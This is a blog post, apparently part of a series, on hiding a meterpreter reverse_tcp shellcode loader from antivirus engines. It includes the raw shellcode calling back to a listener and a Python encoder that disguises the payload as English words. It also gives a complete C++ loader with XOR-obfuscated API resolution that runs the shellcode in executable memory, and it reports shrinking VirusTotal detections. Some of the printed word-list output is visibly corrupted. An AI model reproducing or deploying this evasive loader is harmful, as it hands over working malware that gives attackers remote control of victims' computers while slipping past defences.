---
layout: post
title:  "Embedded Shellcode Obfuscation Part 2 (C++)"
date:   2023-09-17 00:00:00 +0000
categories: malware
---

A continuation of the previous chapter. We'll continue to attempt more obfuscation techniques with the same objective of bypassing VirusTotal. 

Because it seemed to play a part in detection - all code below will be compiled with the command `g++ .\main.cpp -o main.exe --std=c++20 -s`. The added `-s` flag removes all symbol table and relocation information.

We left off on version `main6.cpp`, now compiled to `main6_stripped.exe`. As of said version, the malware has the following features.
+ Dynamic loading of WinAPIs - `VirtualAlloc`, `CreateThread`, `WaitForSingleObject`.
+ Obfuscated strings of abovementioned WinAPIs with FLOSS bypass.
+ XOR decoding of meterpreter shellcode.
+ Execution of meterpreter shellcode in local process.

<br>
As of 17 Sep 2023, 4/71 vendors flag the current version on VirusTotal. Interesting to note that stripping the binary (-s) had led to different detection and classification results.

SHA256: [899db787a234bcaf90ae381fd034c6b119a5f5f96b54c5a507a548397ea404b9](https://www.virustotal.com/gui/file/899db787a234bcaf90ae381fd034c6b119a5f5f96b54c5a507a548397ea404b9)

![vt_stripped](/assets/post_assets/embedded-shellcode-obfuscation/vt_stripped.png)

<br>
It was getting tough trying to find ways to bypass detection. I'm unsure of what characteristics or signatures were flagged. To throw a wild guess, perhaps traits like filesize, entropy, length of encrypted bytes were used. Also, I didn't want to pack the binary - that would be too simple.

To note of current progress, Windows Defender does not detect `main6_stripped.exe` while on the filesystem. But is flagged when executed.

![windef](/assets/post_assets/embedded-shellcode-obfuscation/windef.png)

<br>
### 1. English Encoding
By iteratively throwing parts of the malware into VirusTotal, I narrowed down the detection to the payload itself. In part 1, we discussed the use of XOR payload encoding. Let's try something else. 

Introducing - English Encoding™ - to encode the shellcode into a list of English words. I'll describe the algorithm as such,
+ List of English words are generated.
+ For each word, calculate, sum(letters) % 0x100. If the sum matches the shellcode BYTE, save the word to `payload_words`.
+ Decode the shellcode given the 

Below is the encoder in python. I have reverted to the default meterpreter payload (windows/meterpreter/reverse_tcp LHOST=10.0.0.128 LPORT=443 -f c).

{% highlight python %}
# pip install english-words

from english_words import get_english_words_set
SHELLCODE = "\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x01\xd3\x50\x8b\x48\x18\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\x00\x00\x80\x68\x02\x00\x01\xbb\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"

wordlist = get_english_words_set(['web2'], lower=True)
shellcode_intarray = [ord(byte) for byte in SHELLCODE]
payload_words = []

for num in shellcode_intarray:
    for word in wordlist:
        value = 0
        for char in word:
            value += ord(char)
        if value % 0x100 == num:
            payload_words.append(word)
            break

print('char* payload_words[] {"' + '", "'.join(payload_words) + '"};')

# OUTPUT
# char* payload_words[] {"mounted", "priapic", "pricklyback", "ouphish", "ouphish", "ouphish", "schoppen", "mackintosh", "detroiter", "rarish", "sarcoid", "cornuted", "palaeogeographic", "protoheresiarch", "smush", "palaeogeographic", "protoheresiarch", "cinnamonwood", "palaeogeographic", "protoheresiarch", "pendecagon", "mackintosh", "antinarcotic", "iridescently", "odontoplast", "sweatproof", "overglance", "palaeogeographic", "bennettitales", "conalbumin", "mackintosh", "patesiate", "shockable", "ericophyte", "mycogone", "trachinidae", "reawakenment", "aotus", "velte", "noncommunication", "reinstate", "sequestrectomy", "strepen", "fluviatic", "pomiferous", "homotype", "duchess", "protoheresiarch", "palaeogeographic", "protoheresiarch", "fatbrained", "ranunculaceae", "palaeogeographic", "nowanights", "ericophyte", "strepen", "footlight", "palaeogeographic", "plasmosome", "premourn", "idoism", "patesiate", "bedkey", "occamism", "strepen", "footlight", "palaeogeographic", "balantidiasis", "velte", "strepen", "towy", "superficialness", "palaeogeographic", "unavowably", "spectacled", "idoism", "unseaworthy", "bedkey", "ericophyte", "mackintosh", "antinarcotic", "pomiferous", "palaeogeographic", "backtack", "palaeogeographic", "strepen", "anhinga", "mackintosh", "patesiate", "noncommunication", "reinstate", "sequestrectomy", "shockable", "strepen", "fluviatic", "retinerved", "hemiparasitism", "homotype", "kyphoscoliotic", "sceneshifter", "hickey", "unattainable", "devotement", "hickey", "robotization", "homotype", "hemiparasitism", "balantidiasis", "palaeogeographic", "balantidiasis", "robotization", "strepen", "towy", "shirtman", "palaeogeographic", "cinnamonwood", "pir", "palaeogeographic", "balantidiasis", "binucleate", "strepen", "towy", "palaeogeographic", "superexpansion", "palaeogeographic", "strepen", "footlight", "rarish", "misventurous", "robotization", "robotization", "bradbury", "bradbury", "mycogone", "theodicy", "ringtail", "tagalize", "antinarcotic", "hemiparasitism", "balantidiasis", "coryphylly", "ringtail", "palaeogeographic", "mugwump", "unalterability", "warmed", "antinarcotic", "antinarcotic", "antinarcotic", "desensitization", "isoteles", "heptameron", "cloisteral", "ouphish", "ouphish", "isoteles", "noncollection", "picard", "cloisteral", "coryphylly", "stereotype", "isoteles", "occamism", "noncollection", "overglance", "dryfoot", "rarish", "priapic", "antinarcotic", "footlight", "fissiparous", "artgum", "strepen", "ouphish", "ouphish", "lineograph", "sphenocephalia", "stereotype", "superficialness", "isoteles", "lineograph", "warmed", "tidology", "ouphish", "antinarcotic", "rd", "robotization", "iridescently", "idoism", "ergothioneine", "antinarcotic", "ant, "pataca", "superexpansion", "acquaint", "ranunculaceae", "isoteles", "reawakenment", "unheroize", "leucaurin", "coryphylly", "antinarcoinarcotic", "antinarcotic", "unalterability", "amid", "antinarcotic", "antinarcotic, "palaeogeographic", "redisperse", "pataca", "plasmosome", "isoteles", "ouphish", "fatbrained", "ouphish", "ouphish", "acquaint", "patac", "antinarcotic", "strepen", "carvoepra", "lineograph", "basisphenoidal", "homotypantinarcotic", "regalia", "deplethoric", "prepared", "pataca", "ouphish", "acquaint", "prepared", "ranunculaceae", "isoteles", "reawakenme", "noncommunication", "carvoepra", "alismales", "heartbreaker", "cabriolet", "upred", "unattainable", "ouphish", "hickey", "conalbumin", "balantidiasis", "isoteles", "ouphish", "plasmosome", "ouphish", "ouphish", "pataoom", "acquaint", "pataca", "ouphish", "prepared", "antinarcotic", "regalia"}; 

{% endhighlight %}

<br>
Similarly, in C++, we decode the payload. Below will be the full code.

{% highlight cpp %}
#include <windows.h>

typedef LPVOID(WINAPI* VirtualAllocPtr)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef HANDLE(WINAPI* CreateThreadPtr)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD(WINAPI* WaitForSingleObjectPtr)(HANDLE hHandle, DWORD dwMilliseconds);

const char* payload_words[] = {"protend", "matador", "pathophobia", "pseudarthrosis", "pseudarthrosis", "pseudarthrosis", "inornate", "allophylic", "nondiffractive", "sashay", "buttonbur", "forecastleman", "pectoralgia", "indicter", "ancistroid", "pectoralgia", "indicter", "intemperably", "pectoralgia", "indicter", "kokan", "allophylic", "archapostate", "keraunophone", "urao", "viviparism", "adenophyma", "pectoralgia", "ptilinum", "malacology", "allophylic", "graticule", "balsamine", "notommatid", "careworn", "overliberally", "restrictionary", "plasticine", "theopsychism", "thumbbird", "vesiculotympanic", "uninchoative", "shopful", "hexanchus", "secluded", "skirwhit", "stomachfulness", "indicter", "pectoralgia", "indicter", "golaseccan", "temanite", "pectoralgia", "probroadcasting", "notommatid", "shopful", "unroaming", "pectoralgia", "urobenzoic", "oversoft", "punishability", "graticule", "tertiary", "leucocytoplania", "shopful", "unroaming", "pectoralgia", "protominobacter", "theopsychism", "shopful", "urotoxicity", "chaperon", "pectoralgia", "subauditur", "mushheaded", "punishability", "pseudotubercular", "tertiary", "notommatid", "allophylic", "archapostate", "secluded", "pectoralgia", "germanizer", "pectoralgia", "shopful", "macrame", "allophylic", "graticule", "thumbbird", "vesiculotympanic", "uninchoative", "balsamine", "shopful", "hexanchus", "agnoiology", "assortive", "skirwhit", "coindication", "puistie", "nonexcavation", "unstickingness", "metapepsis", "nonexcavation", "omnivoracity", "skirwhit", "assortive", "protominobacter", "pectoralgia", "protominobacter", "omnivoracity", "shopful", "urotoxicity", "figurism", "pectoralgia", "intemperably", "commerce", "pectoralgia", "protominobacter", "magnetometry", "shopful", "urotoxicity", "pectoralgia", "daywrit", "pectoralgia", "shopful", "unroaming", "sashay", "directed", "omnivoracity", "omnivoracity", "inhumate", "inhumate", "careworn", "synteresis", "incommutability", "proximally", "archapostate", "assortive", "protominobacter", "hrothgar", "incommutability", "pectoralgia", "unrecaptured", "courteous", "megaluridae", "archapostate", "archapostate", "archapostate", "unbasket", "reshovel", "oafishness", "saccharomycetic", "pseudarthrosis", "pseudarthrosis", "reshovel", "sendal", "daimio", "saccharomycetic", "hrothgar", "demargarinate", "reshovel", "leucocytoplania", "sendal", "adenophyma", "neurographic", "sashay", "matador", "archapostate", "unroaming", "caudation", "liguliflorous", "shopful", "pseudarthrosis", "pseudarthrosis", "unpoliteness", "placodont", "demargarinate", "chaperon", "reshovel", "unpoliteness", "megaluridae", "albocinereous", "pseudarthrosis", "archapostate", "irritancy", "gnosiological", "ptolemy", "reshovel", "ptolemy", "pseudarthrosis", "pseudarthrosis", "megaluridae", "reshovel", "restrictionary", "pseudarthrosis", "shopful", "gyve", "sashay", "sledger", "chaperon", "chaperon", "chaperon", "chaperon", "urobenzoic", "chaperon", "urobenzoic", "chaperon", "reshovel", "homochromatism", "keraunophone", "resinosis", "assortive", "archapostate", "irritancy", "disputatively", "gnosiological", "golaseccan", "constitutionality", "temanite", "reshovel", "cyclobutane", "pseudoprofessional", "tertiary", "careworn", "archapostate", "irritancy", "punishability", "graticule", "tertiary", "ptolemy", "archapostate", "imprescriptible", "cephalagra", "skirwhit", "ampulla", "matador", "morphiomaniac", "pseudarthrosis", "pseudarthrosis", "pseudarthrosis", "gnosiological", "pseudarthrosis", "gnosiological", "daywrit", "constitutionality", "temanite", "reshovel", "restrictionary", "unheroize", "pustulation", "hrothgar", "archapostate", "irritancy", "anthropomancy", "unstickingness", "pseudarthrosis", "woodworm", "spirochete", "pectoralgia", "spirochete", "gnosiological", "urobenzoic", "reshovel", "pseudarthrosis", "golaseccan", "pseudarthrosis", "pseudarthrosis", "constitutionality", "gnosiological", "pseudarthrosis", "reshovel", "protominobacter", "repetticoat", "dermatoconiosis", "buttonbur", "archapostate", "irritancy", "trichy", "dermatoconiosis", "gnosiological", "pseudarthrosis", "constitutionality", "dermatoconiosis", "temanite", "reshovel", "restrictionary", "unheroize", "pustulation", "hrothgar", "archapostate", "irritancy", "anthropomancy", "unstickingness", "pseudarthrosis", "nonexcavation", "malacology", "protominobacter", "reshovel", "pseudarthrosis", "urobenzoic", "pseudarthrosis", "pseudarthrosis", "gnosiological", "pseudarthrosis", "chaperon", "reshovel", "hypoglycemia", "usent", "keraunophone", "ancistroid", "archapostate", "irritancy", "temanite", "reshovel", "skirwhit", "actiniomorpha", "bivalved", "careworn", "archapostate", "irritancy", "scandalmonger", "scandalmonger", "archapostate", "intemperably", "omnivoracity", "keraunophone", "punishability", "pagina", "archapostate", "archapostate", "archapostate", "courteous", "prison", "archapostate", "archapostate", "archapostate", "shopful", "baptistic", "unpoliteness", "aporphine", "skirwhit", "thumbbird", "baptistic", "gyve", "chamaesiphon", "mythopoetic", "imprecision", "constitutionality", "gnosiological", "pseudarthrosis", "dermatoconiosis", "archapostate", "irritancy"};

int SHELLCODE_LENGTH = sizeof(payload_words) / 4;
char payload[354];

void decode_payload() {
    for (int i {0}; i < SHELLCODE_LENGTH; i++) {
        int j = 0;
        int value = 0;
        while (payload_words[i][j] != '\0') {
            value += (int) payload_words[i][j];
            j++;
        }
        value = value % 0x100;
        payload[i] = value;
    }
}

HMODULE load_module(char* string, int size) {
    for (int i {0}; i < size - 1; i ++) {
        string[i] = string[i] ^ 0x27;
        HMODULE handle = LoadLibraryA(string);
        if (handle) {
            return handle;
        }
    }
    return 0;
}

DWORD load_api(HMODULE dll, char* string, int size) {
    for (int i {0}; i < size - 1; i ++) {
        string[i] = string[i] ^ 0x27;
        DWORD address = (DWORD) GetProcAddress(dll, string);
        if (address) {
            return address;
        }
    }
    return 0;
}

int main() {
    char kernel32_str[] {"\x4c\x42\x55\x49\x42\x4b\x14\x15\x09\x43\x4b\x4b"};
    char virtual_alloc_str[] {"\x71\x4e\x55\x53\x52\x46\x4b\x66\x4b\x4b\x48\x44"};
    char create_thread_str[] {"\x64\x55\x42\x46\x53\x42\x73\x4f\x55\x42\x46\x43"};
    char wait_for_single_obj_str[] {"\x70\x46\x4e\x53\x61\x48\x55\x74\x4e\x49\x40\x4b\x42\x68\x45\x4d\x42\x44\x53"};

    decode_payload();

    HMODULE kernel32 = load_module(kernel32_str, sizeof(kernel32_str));
    VirtualAllocPtr virtual_alloc = (VirtualAllocPtr) load_api(kernel32, virtual_alloc_str, sizeof(virtual_alloc_str));
    CreateThreadPtr create_thread = (CreateThreadPtr) load_api(kernel32, create_thread_str, sizeof(create_thread_str));
    WaitForSingleObjectPtr wait_for_single_obj = (WaitForSingleObjectPtr) load_api(kernel32, wait_for_single_obj_str, sizeof(wait_for_single_obj_str));
    
    LPVOID memory = virtual_alloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    memcpy(memory, payload, sizeof(payload));

    HANDLE hThread = create_thread(NULL, 0, (LPTHREAD_START_ROUTINE) memory, 0, 0, NULL);
    wait_for_single_obj(hThread, INFINITE);
    
    return 0;
}
{% endhighlight %}

<br>
Only 1 detection on VirusTotal! But by a Machine Learning engine... There's no rulebook to bypassing AI. This will be tough.

SHA256: [6ec9895e2e01df36dc4f68b32690bce567beeba2da11c550c13262ef45555611](https://www.virustotal.com/gui/file/6ec9895e2e01df36dc4f68b32690bce567beeba2da11c550c13262ef45555611)

![vt_english](/assets/post_assets/embedded-shellcode-obfuscation/vt_english.png)
